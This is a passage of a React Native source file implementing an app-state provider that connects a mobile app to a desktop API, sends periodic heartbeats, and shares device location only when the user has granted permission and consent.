      autoConnectAttempted.current
    ) return;
    autoConnectAttempted.current = true;
    void connectToDesktopRef.current(apiUrl, token);
  }, [hydrated, token, apiUrl, deviceIdentity, locationSharing]);

  useEffect(() => {
    const heartbeat = setInterval(() => {
      void (async () => {
        let location = deviceLocation;
        let sharing = locationSharing;
        if (locationSharing) {
          const current = await getPositionWithTimeout(4000);
          if (current) {
            location = { latitude: current.coords.latitude, longitude: current.coords.longitude, accuracy: current.coords.accuracy };
            setDeviceLocation(location);
          } else {
            location = null;
            sharing = false;
            setDeviceLocation(null);
            setLocationSharingState(false);
            void AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
          }
        }
        try {
          const isConnected = connectionStatus === "connected" && token;
          const checkUrl = isConnected ? `${apiUrl}/health` : `${apiUrl}/chat/messages`;
          const activeToken = isConnected ? token : "";
          const response = await fetch(checkUrl, { headers: authHeaders(activeToken, deviceIdentity, sharing, location) });
          if (response.status !== 401) {
            applyBlockedResponse(response);
          }
        } catch { /* Connection can resume on the next heartbeat. */ }
      })();
    }, 15_000);
    return () => clearInterval(heartbeat);
  }, [connectionStatus, apiUrl, token, deviceIdentity, locationSharing]);

  useEffect(() => {
    if (!apiUrl || !deviceIdentity || token || !locationSharing) return;
    let stopped = false;
    const sendLocation = async () => {
      const permission = await Location.getForegroundPermissionsAsync().catch(() => ({ granted: false }));
      if (!permission.granted) {
        if (!stopped) {
          setLocationSharingState(false);
          setDeviceLocation(null);
          void AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
        }
        return;
      }
      const current = await getPositionWithTimeout(8000);
      if (stopped || !current) return;
      const location = { latitude: current.coords.latitude, longitude: current.coords.longitude, accuracy: current.coords.accuracy };
      setDeviceLocation(location);
      try {
        const response = await fetch(`${apiUrl}/devices/anomaly`, {
          method: "POST",
          headers: { "Content-Type": "application/json", ...authHeaders("", deviceIdentity, true, location) },
          body: JSON.stringify({ consent: true }),
        });
        if (response.status === 423) {
          setAccessBlocked(true);
          setConnectionMessage("Device ini diblokir administrator desktop.");
        } else if (!response.ok) {
          const body = await response.json().catch(() => null) as { error?: string } | null;
          setConnectionMessage(body?.error ?? `Desktop menolak pembaruan lokasi (HTTP ${response.status}).`);
        } else {
          setConnectionMessage("Status device anomali aktif terkirim ke Desktop.");
        }
      } catch {
        setConnectionMessage("Desktop tidak dapat dijangkau untuk mengirim status device anomali.");
      }
    };
    void sendLocation();
    const heartbeat = setInterval(() => void sendLocation(), 15_000);
    return () => {
      stopped = true;
      clearInterval(heartbeat);
    };
  }, [apiUrl, deviceIdentity, token, locationSharing]);

  // Bentuk nilai context yang dipakai screen melalui hook useAppState.
  const value = useMemo<AppStateValue>(() => ({
    apiUrl,
    connectionStatus,
    connectionMessage,
    tokenPresent: Boolean(token),
    websiteAuditHeaders: {
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(deviceIdentity ? { "X-Zra-Device-Id": deviceIdentity.id } : {}),
    },
    history,
    hasDesktopApi: connectionStatus === "connected" && locationSharing && deviceLocation !== null,
    accessBlocked,
    retryAccessCheck,
    locationSharing,
    deviceLocation,
    deviceIdentity,
    fetchChatMessages,
    sendChatMessage,
    updateRequired,
    updateInfo,
    updateProgress,
    checkForUpdate,
    downloadAndInstallUpdate,
    setLocationSharing,
    setDesktopUrl,
    connectToDesktop,
    disconnect,
    addHistory,
    clearHistory,
    queueJob,
    submitJob,
    waitForJob,
    reportApkScan,
    syncHistory,
    activeActivity,
    setActiveActivity,
  }), [accessBlocked, apiUrl, connectionMessage, connectionStatus, deviceIdentity, deviceLocation, history, locationSharing, token, updateRequired, updateInfo, updateProgress, activeActivity]);

  if (!hydrated) return null;
  return <AppStateContext.Provider value={value}>{children}</AppStateContext.Provider>;
}

export function useAppState() {
  // Beri pesan jelas jika hook dipanggil di luar AppStateProvider.
  const value = useContext(AppStateContext);
  if (!value) throw new Error("useAppState must be used inside AppStateProvider");
  return value;
}
